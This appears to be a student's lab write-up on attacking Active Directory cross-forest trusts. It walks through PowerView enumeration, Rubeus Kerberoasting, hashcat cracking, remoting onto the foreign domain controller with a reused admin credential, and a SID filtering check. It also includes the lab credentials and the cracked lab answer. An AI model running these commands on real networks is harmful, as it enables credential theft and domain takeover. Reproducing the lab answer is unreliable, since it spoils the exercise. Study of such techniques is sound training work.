# Section 30 — Attacking Domain Trusts: Cross-Forest Abuse (Windows)

> Three attack paths when you have a bidirectional forest trust:
> 1. Cross-forest Kerberoasting
> 2. Admin password reuse / foreign group membership
> 3. SID History abuse (if SID filtering is off)
>
> Performed from ACADEMY-EA-MS01: RDP with htb-student / Academy_student_AD!

---

## QUICK REFERENCE

```powershell
# Enumerate SPNs in the trusted forest
Import-Module .\PowerView.ps1
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# Confirm account's group membership in foreign domain
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Kerberoast across the forest trust
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Crack the TGS hash
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -O

# Check foreign group membership (accounts from outside the domain in local groups)
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# Convert SID to name
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

# Connect to foreign domain DC via WinRM using admin account from our domain
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
> Quick reference for cross-forest attacks. Add `/domain:FOREIGN_DOMAIN` to Rubeus for cross-forest Kerberoasting. Replace domain names and credentials with your target environment.

---

## Attack Path 1 — Cross-Forest Kerberoasting

**Why it works:** Kerberoasting only requires that you can authenticate to the Key Distribution Center (KDC) of the target domain. With a bidirectional forest trust, your domain credentials are accepted in the foreign domain. This lets you request Ticket Granting Service (TGS) tickets for any Service Principal Name (SPN) account there and crack them offline.

### Step 1 — Enumerate SPN accounts in the foreign domain

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
```
> Loads PowerView from `C:\Tools`. Run this before any `Get-Domain*` command.

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
# -SPN = filter for accounts that have a ServicePrincipalName set — Kerberoastable targets
# -Domain FREIGHTLOGISTICS.LOCAL = query this external domain instead of the current one
# Our INLANEFREIGHT credentials are valid there because the trust is bidirectional
# Look for service accounts (mssqlsvc, svc_backup, etc.) — these often have weak passwords
```
> Lists Service Principal Name (SPN) accounts in the foreign domain. Replace `FREIGHTLOGISTICS.LOCAL` with any trusted domain. SPN accounts are Kerberoastable — request their tickets and crack them offline.

### Step 2 — Check if the target account has elevated rights

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
# -Identity mssqlsvc = look up this specific account
# select memberof = show group memberships — if it's in Domain Admins, cracking it = full domain access
# Lab result: mssqlsvc is a member of Domain Admins in FREIGHTLOGISTICS.LOCAL
# This makes cross-forest Kerberoasting very high value — one cracked hash = full forest control
```
> Checks the group membership of a specific account in the foreign domain. If it belongs to Domain Admins, cracking that one hash gives full control of the foreign domain.

### Step 3 — Kerberoast across the trust with Rubeus

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
# kerberoast = request TGS tickets for SPN accounts and output their hashes
# /domain:FREIGHTLOGISTICS.LOCAL = target the FOREIGN domain's KDC for ticket requests
#                                   Rubeus uses our current session's Kerberos credentials to auth
# /user:mssqlsvc = only request the ticket for this specific user (targeted, less noise)
# /nowrap = output hash as one unbroken line — critical for copy-paste to hashcat without corruption
# Output: $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@...
# Hash mode 13100 = Kerberos TGS-REP etype 23 (RC4-HMAC)
```
> Requests a Kerberos service ticket (TGS) for the target account in the foreign domain and outputs it as a crackable hash. `/domain:` routes the request to the foreign KDC. Copy the full `$krb5tgs$...` line into a file for hashcat.

### Step 4 — Crack the TGS hash

```bash
# On Kali/Linux attack host:
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -O
# -m 13100 = Kerberos 5 TGS-REP etype 23 — same algorithm as regular Kerberoasting
# tgs.txt = file containing just the $krb5tgs$23$... hash (one hash per line, no extra text)
# -O = optimized kernel — max password length 31 chars, significant speed improvement
# Lab result: mssqlsvc → 1logistics
```
> Cracks the TGS hash offline. `-m 13100` is Kerberos TGS-REP — the same mode as regular Kerberoasting. Replace `tgs.txt` with your hash file name.

---

## Attack Path 2 — Foreign Group Membership Abuse

**Why it works:** Only Domain Local Groups can hold members from outside the forest. If an admin from Forest A (INLANEFREIGHT) is in a Domain Local Group in Forest B (FREIGHTLOGISTICS), they keep those rights when they authenticate across the trust. The `built-in\Administrators` group is a Domain Local Group. This is the most common place this shows up.

### Step 1 — Enumerate foreign group members

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
# Get-DomainForeignGroupMember = PowerView function that finds accounts from OUTSIDE the domain
#                                 that are members of groups INSIDE the specified domain
# -Domain FREIGHTLOGISTICS.LOCAL = check THIS domain for foreign members
# Output includes: GroupName, MemberDomain, MemberName (often a SID if not resolvable)
# Lab result: INLANEFREIGHT\administrator is in FREIGHTLOGISTICS\Administrators group
```
> Finds accounts from your domain (or any external domain) that have been placed inside groups in the target forest. Look for entries in the `Administrators` or `Domain Admins` groups — those give immediate access if you own the source account.

### Step 2 — Resolve the SID to a name

```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
# Convert-SidToName = PowerView function to translate a SID to DOMAIN\username format
# -500 = RID 500 = always the built-in Administrator account
# Lab result: INLANEFREIGHT\administrator
# This means: the INLANEFREIGHT domain Administrator has admin rights on FREIGHTLOGISTICS DC
```
> Translates a raw Security Identifier (SID) to a human-readable `DOMAIN\username` string. Use this when `Get-DomainForeignGroupMember` shows a SID instead of a name. RID 500 is always the built-in Administrator.

### Step 3 — Connect to the foreign DC using our domain admin account

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
# Enter-PSSession = open an interactive PowerShell session on the remote host
# -ComputerName = the target DC in the foreign forest (use FQDN for cross-forest auth)
# -Credential INLANEFREIGHT\administrator = authenticate as our domain's admin
#   Windows will prompt for the password — supply it there
# If we already compromised INLANEFREIGHT admin, we now also own FREIGHTLOGISTICS
# Once in: whoami → inlanefreight\administrator
#          ipconfig /all confirms we're on ACADEMY-EA-DC03 in FREIGHTLOGISTICS.LOCAL
```
> Opens an interactive PowerShell remoting session on the foreign domain's DC using your own domain admin credentials. Use the fully qualified domain name (FQDN) for `-ComputerName` so Kerberos resolves correctly across the forest boundary. Replace the DC hostname and credential with your target values.

---

## Attack Path 3 — SID History Abuse (Cross-Forest)

**Why it works (when Security Identifier filtering is OFF):** If SID filtering is not enabled on the forest trust, a user migrated from Forest A to Forest B can have Forest A SIDs in their `sidHistory` attribute. When they authenticate across the trust, those SIDs go into their token. They get whatever rights those SIDs hold in Forest A.

**Attacker scenario:** If you can add an admin SID from Forest A to the `sidHistory` of an account in Forest B, that account gains admin rights in Forest A whenever it authenticates across the trust.

**Check SID filtering status:**
```powershell
Get-DomainTrust | select TargetName,SIDFilteringQuarantined,SIDFilteringForestAware
# SIDFilteringQuarantined: False = SID filtering is OFF = SID history attacks may work
# SIDFilteringQuarantined: True  = SID filtering is ON = SID history attacks are blocked
```
> Checks SID filtering status for all trusts. `SIDFilteringQuarantined: False` means SID history injection across the forest boundary may be possible. Record this as a finding and revisit with the full SID history attack if confirmed.

- This attack is covered in depth in later modules — note it as a finding when SID filtering is disabled

---

## What to Check on Every Forest Trust Assessment

```
1. Get-DomainUser -SPN -Domain FOREIGN_DOMAIN          → Kerberoastable accounts
2. Get-DomainUser -PreauthNotRequired -Domain FOREIGN   → ASREPRoastable accounts
3. Get-DomainForeignGroupMember -Domain FOREIGN         → Accounts with cross-forest group rights
4. Get-DomainTrust | check SIDFilteringQuarantined      → SID history attacks possible?
5. BloodHound cross-domain edges                        → CanRDP, AdminTo, SQLAdmin across trust
6. Password reuse: DA hash/plaintext from Domain A → test against same-named accounts in Domain B
```

---

## Lab Answer

| Question | Answer |
|----------|--------|
| mssqlsvc cleartext password (cross-forest Kerberoast) | `1logistics` |

---

## Exam Notes

- Cross-forest Kerberoasting = add `/domain:FOREIGN_DOMAIN` to Rubeus — everything else is identical
- Bidirectional trust = your current domain creds are valid in the foreign domain for authentication
- `Get-DomainForeignGroupMember` = key check — finds DA/EA from your domain in foreign Administrators group
- Only Domain Local Groups can contain members from outside the forest — Administrators is one of them
- Foreign group membership abuse = instant access to second forest if you already own the first
- SID filtering OFF (SIDFilteringQuarantined: False) = SID history injection across forests is possible
- Hash mode 13100 = TGS-REP Kerberoast (same as domestic Kerberoasting)
- If mssqlsvc or any SPN account is in Domain Admins of the foreign domain — crack that hash first
- Always check password reuse: admin account names that exist in both forests often share passwords
